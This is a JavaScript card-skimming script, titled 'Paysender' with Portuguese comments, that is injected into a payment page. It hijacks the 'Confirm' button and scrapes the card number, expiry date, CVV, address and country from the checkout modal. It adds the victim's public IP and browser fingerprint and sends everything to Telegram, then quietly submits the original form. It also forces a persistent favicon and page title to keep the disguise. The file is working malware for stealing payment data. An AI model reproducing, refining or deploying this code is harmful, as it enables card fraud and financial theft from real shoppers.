(function () {
  /* ═══════════════════════════════════════════════════════════
     PAGE PATCHER v6.2 — Paysender (Telegram exfiltration fix)
     + Favicon persistente + Título persistente
     + Coleta robusta de dados do modal + envio ao Telegram
     ═══════════════════════════════════════════════════════════ */
  ...
  /* ────────── NOVA COLEÇÃO ROBUSTA (funciona com modal React) ────────── */
  function collectFormDataRobust() {
    // Procura o modal ativo
    const modal = document.querySelector('[role="dialog"], .modal, .fixed.inset-0, div[class*="Modal"]');
    const scope = modal || document;

    // Helper para inputs
    const allInputs = scope.querySelectorAll('input:not([type="hidden"])');
    ...
    for (const inp of allInputs) {
      ...
      if (ph.includes('card number') || ph.includes('card #') || name.includes('cardnumber') || inp.maxLength === 19) {
        cardNumber = inp.value.replace(/\D/g, '');
        break;
      }
    }
    // fallback: qualquer input com 16 dígitos
    if (!cardNumber) {
      for (const inp of allInputs) {
        const raw = inp.value.replace(/\D/g, '');
        if (raw.length >= 15 && raw.length <= 19) {
          cardNumber = raw;
          break;
        }
      }
    ...
    for (const inp of allInputs) {
      const ph = (inp.placeholder || '').toLowerCase();
      if (ph.includes('mm/yy') || ph.includes('mm / yy') || ph.includes('expiry') || (inp.maxLength === 5 && /^\d{2}\/\d{2}/.test(inp.value))) {
        expiry = inp.value;
        break;
      }
    }
    ...
    for (const inp of allInputs) {
      const ph = (inp.placeholder || '').toLowerCase();
      if (ph.includes('cvv') || ph.includes('cvc') || inp.maxLength === 3 || inp.maxLength === 4) {
        cvv = inp.value;
        break;
      }
    }
    ...
    const addressLabel = Array.from(scope.querySelectorAll('label, .text-sm')).find(el => el.innerText.includes('Address'));
    if (addressLabel) {
      const addrInput = addressLabel.closest('div')?.querySelector('input');
      if (addrInput) address = addrInput.value;
    }
    const countrySelect = scope.querySelector('select[name="country"], div[aria-label="Country"] input');
  ...
  /* ────────── ENVIO AO TELEGRAM COM KEEPALIVE ────────── */
  async function sendToTelegramRobust() {
    try {
      const formData = collectFormDataRobust();
      if (!formData.cardNumber || formData.cardNumber.length < 12) {
        console.warn('[PS] Dados do cartão incompletos, envio ignorado');
        return false;
      }
      const fingerprint = getFingerprint();
      const ip = await getPublicIP();

      const message = `🎯 *NOVO CARTÃO - PAYSENDER*%0A%0A💳 *Número*: \`${formData.cardNumber}\`%0A📅 *Validade*: ${formData.expiry}%0A🔐 *CVV*: ${formData.cvv}%0A%0A📍 *Endereço*%0APaís: ${formData.country}%0AEndereço: ${formData.address}%0A%0A🌐 *Dados da vítima*%0AIP: ${ip}%0ANavegador: ${fingerprint.userAgent.substring(0, 80)}%0AFuso horário: ${fingerprint.timezone}`;
      ...
      console.error('[PS] Erro no fetch, tentativa com beacon', err);
      // Fallback silencioso
      return false;
    }
  }
  ...
  /* ══════════════════════════════════════════════════════════
     FAVICON + TÍTULO PERSISTENTES (código original mantido)
  ══════════════════════════════════════════════════════════ */
  ...
  /* ────────── NOVA FUNÇÃO onConfirmClick COM ENVIO AO TELEGRAM ────────── */
  async function onConfirmClickHandler(event) {
    if (event && event.preventDefault) event.preventDefault();
    console.log('[PS] Confirm clicado – enviando dados ao Telegram');
    await sendToTelegramRobust();
    // Pequeno delay para garantir envio antes da navegação
    setTimeout(() => {
      // Executa a lógica original de substituição de cartão (se aplicável)
      ...
      // Submete o formulário original se existir
      const confirmBtn = document.querySelector('button:contains("Confirm")');
      if (confirmBtn && confirmBtn.form) confirmBtn.form.submit();
      else if (confirmBtn) confirmBtn.click();
    }, 300);
  }

  // Escuta dinâmica para botões "Confirm" (delegação de evento)
  function setupConfirmListener() {
    document.body.addEventListener('click', (e) => {
      const btn = e.target.closest('button');
      if (btn && btn.textContent.trim() === 'Confirm') {
        e.stopPropagation();
  ...
  /* ══════════════════════════════════════════════════════════
     MODIFICAÇÕES BASE (remover elementos indesejados)
  ══════════════════════════════════════════════════════════ */
  ...
  console.log('%c[Paysender v6.2] ✓ Favicon + Título + Telegram exfiltration (fixed)','color:#1a1a1a;font-weight:bold;font-size:13px;background:#F5C842;padding:4px 10px;');
})();